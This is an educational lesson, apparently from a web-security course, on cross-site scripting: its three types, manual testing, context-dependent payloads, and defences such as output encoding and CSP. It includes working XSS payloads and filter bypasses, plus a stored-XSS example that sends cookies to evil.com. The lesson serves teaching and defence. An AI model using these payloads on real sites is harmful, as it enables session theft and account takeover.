# XSS — Cross-Site Scripting

You planted the seed for this back in Path 05.2. Now let's fully understand, find, and exploit **Cross-Site Scripting** — one of the most historically significant web vulnerability classes, and still hugely common today.

## The core idea, precisely

XSS happens when an application includes **untrusted input** in a page's output **without properly neutralising it**, allowing an attacker's JavaScript to execute in another user's browser, in the context of the vulnerable site.

The critical phrase is *"in the context of the vulnerable site"* — the malicious script runs with the same access as the site's own legitimate JavaScript: same cookies (unless HttpOnly), same DOM, same ability to make authenticated requests.

## The three types

### 1. Reflected XSS

The payload is part of the request and immediately "reflected" back in the response — not stored anywhere. Requires tricking a victim into clicking a crafted link.

```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

If the site echoes the search term straight into the page without escaping, visiting that URL executes the script *in the victim's browser*, not the attacker's.

### 2. Stored XSS

The payload is saved on the server (a comment, a username, a profile bio) and served to **every** visitor who views that stored content — no need to trick anyone into clicking a special link. Generally considered more dangerous because of its broader, persistent reach.

```html
<!-- Attacker submits this as a blog comment: -->
<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
```

Every visitor who reads that comment thread runs the attacker's script.

### 3. DOM-based XSS

The vulnerability lives entirely in **client-side JavaScript** — the server may never even see the malicious payload. The page's own JS takes some attacker-controlled input (often from the URL fragment `#...` or `location.search`) and unsafely inserts it into the DOM.

```javascript
// Vulnerable client-side code:
const name = new URLSearchParams(location.search).get("name");
document.getElementById("greeting").innerHTML = "Hello, " + name;
```

Visiting `https://example.com/?name=` triggers execution purely client-side — the server logs might show nothing unusual at all, since the payload never left the browser.

## A visual comparison

```mermaid
flowchart TB
    subgraph Reflected["Reflected XSS"]
        R1[Attacker crafts URL] --> R2[Victim clicks link]
        R2 --> R3[Server echoes payload in response]
        R3 --> R4[Executes in victim's browser]
    end
    subgraph Stored["Stored XSS"]
        S1[Attacker submits payload] --> S2[Server stores it - DB, file]
        S2 --> S3[Any visitor loads the page]
        S3 --> S4[Executes in every visitor's browser]
    end
    subgraph DOM["DOM-based XSS"]
        D1[Attacker crafts URL] --> D2[Victim clicks link]
        D2 --> D3[Client JS reads URL, inserts unsafely]
        D3 --> D4[Executes — server never involved]
    end

    style R4 fill:#2b1010,color:#E05548,stroke:#E05548
    style S4 fill:#2b1010,color:#E05548,stroke:#E05548
    style D4 fill:#2b1010,color:#E05548,stroke:#E05548
```



## What an attacker actually does with it

Once JavaScript executes on a victim's page, in the site's own origin, the attacker can:

- **Steal session cookies** (if not `HttpOnly`) → full account takeover.
- **Perform actions as the victim** — change their email/password, send messages, make purchases.
- **Log keystrokes** on that page.
- **Redirect** the victim to a phishing page.
- **Deface** the page for that victim.
- **Pivot into internal tools** if the victim happens to be an admin viewing an internal dashboard — a classic escalation path for stored XSS in admin-facing panels.

## Finding XSS manually

1. Identify every place user input is reflected somewhere in the response — search boxes, comment fields, URL parameters, profile fields, HTTP headers like `User-Agent` (some apps log and later display these unsafely).
2. Try a harmless-but-detectable payload:

```html
<script>alert(document.domain)</script>
```

3. If it doesn't fire, the app may be doing **partial** filtering. Try common bypasses:

```html

<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
```

4. Check where exactly your input lands by viewing page source / Inspector — is it inside an HTML attribute? Inside a `<script>` block? Inside a comment? Each context needs a different bypass technique.

## Context matters enormously

The correct payload depends entirely on *where* your input lands:

| Context | Example vulnerable code | Typical payload |
|---|---|---|
| HTML body | `<p>{input}</p>` | `<script>alert(1)</script>` |
| HTML attribute | `<input value="{input}">` | `"><script>alert(1)</script>` or `" onmouseover="alert(1)` |
| JavaScript string | `var name = "{input}";` | `";alert(1);//` |
| URL/href attribute | `<a href="{input}">` | `javascript:alert(1)` |

This is why professional testers try many payload variants systematically rather than one universal "magic string" — **PortSwigger's XSS cheat sheet** (linked below) is the field's shared reference for exactly this.

## Defences — how XSS is actually prevented

### 1. Output encoding (the primary defence)

Convert dangerous characters to their safe HTML-entity equivalents **based on the specific output context**:

```
<  →  &lt;
>  →  &gt;
"  →  &quot;
'  →  &#x27;
&  →  &amp;
```

Modern frameworks (React, Vue, Angular) do this **automatically** for standard text rendering — a major reason why XSS, while still common, is somewhat less catastrophic in modern framework-based apps than in the hand-rolled PHP era of the 2000s. The danger reappears when developers explicitly opt out of this protection:

```jsx
// React — SAFE by default, auto-escaped:
<div>{userInput}</div>

// React — DANGEROUS, explicitly opts out of escaping:
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

That function name is not being dramatic — it is exactly as dangerous as it sounds.

### 2. Content Security Policy (CSP)

An HTTP response header restricting which script sources the browser is allowed to execute at all:

```http
Content-Security-Policy: script-src 'self' https://trusted-cdn.com
```

Even if an XSS payload gets injected into the HTML, a strict CSP can prevent it from actually executing (e.g., blocking inline `<script>` tags entirely). Not a silver bullet — CSP bypasses exist — but a genuinely strong defence-in-depth layer.

### 3. HttpOnly cookies

As covered in Path 05.4 — doesn't prevent XSS itself, but limits the damage: even if an attacker's script runs, it can't read the session cookie directly.

### 4. Input validation (secondary, not primary)

Rejecting obviously malicious input patterns helps, but is easily bypassed and should never be the *only* defence — output encoding based on context is the real fix.

## 🧪 Lab — PortSwigger XSS labs

1. Go to [PortSwigger Web Security Academy — Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting).
2. Work through the **Reflected**, **Stored**, and **DOM-based** XSS labs in order.
3. For each, use Burp Repeater to understand exactly how your input reaches the vulnerable sink, then craft the specific payload the lab's context requires.

Also try the browser console exercise from Path 05.2 again with fresh eyes — you now understand *how* an attacker's script would land there in the first place, not just what it can do once it has.

:::challenge Test yourself
An attacker submits a malicious comment on a blog post. The comment is saved to the database, and every visitor who later reads that post automatically executes the attacker's script. Which type of XSS is this?

<details><summary>Show answer</summary><strong>Stored XSS.</strong> The payload persists on the server (in the database) and is served to every visitor who views that content — no crafted link or tricking a specific victim into clicking anything is required.</details>
:::

## Key terms

- **XSS** — injecting attacker-controlled JavaScript that executes in another user's browser, in the site's own context.
- **Reflected / Stored / DOM-based XSS** — the three types, differing in where the payload lives and how it reaches the victim.
- **Output encoding** — converting dangerous characters to safe equivalents based on context; the primary defence.
- **CSP (Content Security Policy)** — a header restricting which scripts a page is allowed to execute.

## Recap

- XSS lets attacker JavaScript run with the same access as the site's own legitimate scripts.
- Reflected needs a crafted link per victim; Stored persists and hits every visitor; DOM-based lives entirely client-side.
- The correct bypass payload depends heavily on exactly where input lands in the page.
- Modern frameworks auto-escape by default — danger reappears when that protection is explicitly bypassed.
- CSP and HttpOnly cookies are strong defence-in-depth layers alongside proper output encoding.

???refs
- [PortSwigger — Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) — the definitive free hands-on resource.
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) — the field's shared reference for context-specific payloads.
- [Content Security Policy — MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
???

**Next up →** [SQL Injection](#/lesson/07-web-security/sqli)
